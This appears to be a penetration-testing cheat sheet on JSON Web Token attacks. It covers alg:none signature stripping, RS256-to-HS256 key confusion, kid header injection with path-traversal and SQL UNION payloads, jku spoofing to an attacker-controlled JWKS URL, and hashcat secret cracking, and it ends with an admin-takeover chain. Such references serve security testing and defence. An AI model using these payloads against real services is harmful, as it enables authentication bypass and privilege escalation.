# JWT Cryptographic Attacks Reference

## Attack Surface Signals
- Bearer tokens in `Authorization: Bearer eyJ...` headers or cookies.
- Three base64url-encoded parts separated by periods: `Header.Payload.Signature`.
- Headers containing `"alg": "RS256"`, `"alg": "HS256"`, `"kid"`, `"jku"`, `"x5u"`.

## Core Attack Techniques
1. **`alg: none` Signature Stripping**:
   - Decode header, set `"alg": "none"`, `"alg": "None"`, `"alg": "NONE"`, or `"alg": "nOnE"`.
   - Modify payload (e.g. `"role": "admin"`, `"user_id": "1"`).
   - Strip signature bytes, preserving trailing period: `base64(header).base64(payload).`.
2. **RS256 → HS256 Key Confusion (Asymmetric to Symmetric)**:
   - Obtain server's public key (from JWKS `/certs`, `/.well-known/jwks.json`, or X.509 cert).
   - Change token header `"alg"` from `RS256` to `HS256`.
   - Sign token using the exact public key string (PEM format or raw bytes) as the HMAC secret key.
   - Broken verifiers verify the token using `HMAC_SHA256(data, publicKey)`.
3. **`kid` (Key ID) Header Injection**:
   - **Path Traversal / Known File**: Set `"kid": "../../../dev/null"` (empty secret), `"kid": "/etc/hosts"`, or static asset file.
   - **SQL Injection in `kid`**: Set `"kid": "key1' UNION SELECT 'my_secret_key'-- -"`.
   - **Command Injection in `kid`**: Exploits backend key-lookup commands.
4. **`jku` / `x5u` Header Spoofing**:
   - Modify `"jku"` to point to an attacker-controlled JWKS URL (`https://attacker.com/.well-known/jwks.json`).
   - Sign token with attacker's private key matching the public key at the attacker's JWKS.
5. **Weak HMAC Secret Cracking**:
   - Offline brute-force using `hashcat -m 16500 jwt.txt wordlist.txt` or `jwt-tool`.

## Exploit Chains
- **JWT Alg:None / Key Confusion → Full Admin Takeover**: Modify `role: "admin"` or `sub: "admin_uuid"` to bypass all authorization checks across the entire API.
